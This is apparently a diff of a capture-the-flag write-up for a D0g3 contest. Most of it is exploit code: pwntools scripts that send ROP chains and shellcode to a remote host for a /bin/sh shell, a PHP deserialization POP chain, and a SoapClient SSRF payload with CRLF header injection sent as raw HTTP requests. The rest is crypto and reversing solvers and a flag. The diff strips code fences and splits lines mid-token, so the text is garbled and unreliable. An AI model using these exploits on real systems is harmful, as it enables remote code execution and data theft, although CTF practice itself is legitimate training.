@@ -445,7 +445,7 @@ Babyphp
 ```
 from pwn import *
 
-#p = process('./chall')
+    #p = process('./chall')
 p=remote('47.108.29.107',10356)
 libc=ELF('./libc-2.27.so')
 context.log_level = 'debug'
@@ -474,18 +474,13 @@ system=libcbase+libc.sym['system']
 binsh=libcbase+libc.search("/bin/sh").next()
 poprdi=libcbase+libc.search(asm("pop rdinret")).next()
 
-#gdb.attach(p,'b* $rebase(0x16FA)')
+    #gdb.attach(p,'b* $rebase(0x16FA)')
 cmd(p8(0x3e)*0x38+(p8(0x2c)+p8(0x3e))*0x20)
 p.send(p64(poprdi+1)+p64(poprdi)+p64(binsh)+p64(system))
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 
-#p = process(["./qemu-arm-static","-L", "/usr/arm-linux-gnueabi/", "./chall"])
+    #p = process(["./qemu-arm-static","-L", "/usr/arm-linux-gnueabi/", "./chall"])
 p=remote('47.108.29.107',10356)
 # libc=ELF('./libc.so.6')
 context.log_level = 'debug'
@@ -519,11 +514,6 @@ shellcode=asm(shellcode)
 payload=shellcode.ljust(0x2c,'x00')+p32(elf.bss()+0x10)
 p.sendline(payload)
 p.interactive()
-```
-
-
-
-```
 code=[ ...]
 
 this=[0]*16
@@ -596,11 +586,6 @@ while(code[ptr]!=0xF4):
         if(a1==0xe3):
             print("ecx-=%d"%a2)
         ptr+=3
-```
-
-
-
-```
 from z3 import *
 data=[0xA7, 0x3A, 0x19, 0xB4, 0xF1, 0x49, 0x2B, 0xCB, 0xEA, 0x0E, 
   0x0E, 0x14]
@@ -729,11 +714,6 @@ for i in range(13):
     tmp ^= (ord("a")+i-1)
     print(chr(tmp),end='')
 #  Ju$t_e@sy_vM
-```
-
-
-
-```
 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
 1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
@@ -774,11 +754,6 @@ for i in range(13):
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 1 0 1 1 1 0 0 0  
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 0 1 0 0  
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 2
-```
-
-
-
-```
 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
 1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1  
@@ -819,11 +794,6 @@ for i in range(13):
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 1 1 1 1 1 0 1 1 1 0 0 0  
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 0 1 0 0  
 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 1 0 1 1 1 1
-```
-
-
-
-```
 index.php
 <?php
 //something in flag.php
@@ -903,17 +873,11 @@ if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
 }else{
    echo "only localhost!!";
 }
-```
-
-
-
-```
-B::__destruct()->C::__toString()->A::__invoke()->C::uwant()
-```
-
-
-
-```
+B::
+__destruct()->C::
+__toString()->A::
+__invoke()->C::
+uwant()
 <?php
 //something in flag.php
 
@@ -973,21 +937,12 @@ $first->a->c->b = new C();
 $first->a->c->b->a = '11111';
 print((serialize($first)));
 //var_dump($_SESSION);
-```
-
-
-
-```
 O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";N;s:1:"c";O:1:"A":3:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:5:"11111";s:1:"c";N;}}}s:1:"b";N;s:1:"k";N;}
-```
-
-
-
-```
 <?php
 $a = new SoapClient(null,
     array(
-        'user_agent' => "aaarnCookie:PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332",  
+        'user_agent' => "aaarnCookie:
+PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332",  
         'uri' => 'bbb',
         // 'location' => 'http://127.0.0.1/flag.php?a=GlobIterator&b=/*f*' //首先用GlobIterator找flag的名字
         'location' => 'http://127.0.0.1/flag.php?a=SplFileObject&b=file:///f1111llllllaagg'
@@ -997,13 +952,9 @@ $a = new SoapClient(null,
 $b = serialize($a);
 echo urlencode($b);
 ?>
-```
-
-
-
-```
 POST /?baby=session.serialize_handler&d0g3=php_serialize HTTP/1.1
-Host: 47.108.29.107:10356
+Host: 47.108.29.107:
+10356
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
@@ -1016,13 +967,9 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 401
 
 sess=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22bbb%22%3Bs%3A8%3A%22location%22%3Bs%3A67%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DSplFileObject%26b%3Dfile%3A%2F%2F%2Ff1111llllllaagg%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A48%3A%22aaa%0D%0ACookie%3APHPSESSID%3Du6ljl69tjrbutbq4i0oeb0m332%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
-```
-
-
-
-```
 POST /?baby&d0g3 HTTP/1.1
-Host: 47.108.29.107:10356
+Host: 47.108.29.107:
+10356
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
@@ -1035,13 +982,9 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
 sess=SoapClient
-```
-
-
-
-```
 POST / HTTP/1.1
-Host: 47.108.29.107:10356
+Host: 47.108.29.107:
+10356
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
@@ -1054,13 +997,9 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 163
 
 pop=O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";N;s:1:"c";O:1:"A":3:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:5:"11111";s:1:"c";N;}}}s:1:"b";N;s:1:"k";N;}
-```
-
-
-
-```
 GET / HTTP/1.1
-Host: 47.108.29.107:10356
+Host: 47.108.29.107:
+10356
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
@@ -1069,11 +1008,6 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332
 Connection: close
-```
-
-
-
-```
 from pwn import *
 from hashlib import *
 from itertools import product
@@ -1098,13 +1032,9 @@ for i in range(6):
     r.sendline(str(x).encode())
     try:
         r.recvuntil(b'wrong number, guess again:n')
-    except:
+    
+except:
         r.interactive()
-```
-
-
-
-```
 ls = ['']
 for i in trange(16):
     s = ''
@@ -1126,11 +1056,6 @@ f2 = ''
 for i in ls:
     f2 += i
 print(f2)
-```
-
-
-
-```
 f1 = ''
 a = 'A' #a从 a-zA-Z0-9 多进程爆破
 for j in trange(len(l)):
@@ -1143,11 +1068,6 @@ for j in trange(len(l)):
         if tmp[:16] == tmp[16:32]:
             print(f1)
             sleep(10000)
-```
-
-
-
-```
 from pwn import *
 from hashlib import *
 from itertools import product
@@ -1157,7 +1077,8 @@ from Crypto.Util.Padding import pad
 from Crypto.Util.number import *
 from gmpy2 import *
 
-r = remote("120.78.131.38",10010)# ,level='debug'
+r = remote("120.78.131.38",10010)
+# ,level='debug'
 _ = r.recvuntil("XXXX + ")
 data = r.recvline().decode().strip('n').split("):")
 
@@ -1194,31 +1115,16 @@ com, s0, s1 = gcdext(E[0],E[1]*E[2])
 assert s0*E[0]+s1*E[1]*E[2] == 1
 m = pow(ce0,s0,n)*pow(c3,s1,n)%n
 print(long_to_bytes(m))
-```
-
-
-
-```
 from Crypto.Util.number import *
 with open('Signal', 'r') as f:
     con = f.read()
 print(long_to_bytes(int(con,2)))
 # 发现压缩包头的特征。
-```
-
-
-
-```
 from Crypto.Util.number import *
 with open('Signal', 'r') as f:
     con = f.read()
 with open('signal.zip', 'wb') as f2:
     f2.write(long_to_bytes(int(con,2)))
-```
-
-
-
-```
 from PIL import Image
 import os
 
@@ -1236,17 +1142,7 @@ for y in range(25):
         timg = Image.open(IMAGES_PATH + str(y*IMAGE_COLUMN + x) + '.png')
         newimg.paste(timg, (x*IMAGE_WIDTH, y*IMAGE_HEIGHT))
 newimg.save('new.png')
-```
-
-
-
-```
 key: 187J3X1&DX3906@!
-```
-
-
-
-```
 D0g3{W3Lc0Me_T@_E4rth!!}
 ```
 
